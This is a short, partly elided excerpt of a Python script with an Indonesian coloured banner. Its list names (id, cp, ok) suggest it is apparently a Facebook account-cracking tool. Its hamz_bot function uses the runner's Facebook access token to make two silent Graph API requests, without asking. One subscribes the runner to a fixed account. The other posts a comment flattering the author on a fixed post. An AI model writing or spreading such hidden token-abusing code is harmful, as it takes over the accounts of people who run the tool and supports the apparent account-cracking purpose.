...
\033[0;93m  •••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m       Niki\033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT 
\033[0;96m [][][][][][][][][][][][][][[]][[]][[]][[]][[]][[]]""""")
id = []
cp = []
ok = []
...
def hamz_bot():
    ...
    kom = " Bang @[100039177390395:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
    requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + token)
    ...
    requests.post('https://graph.facebook.com/254018450221419/comments/?message=' +kom+ '&access_token=' + token)
    menu()
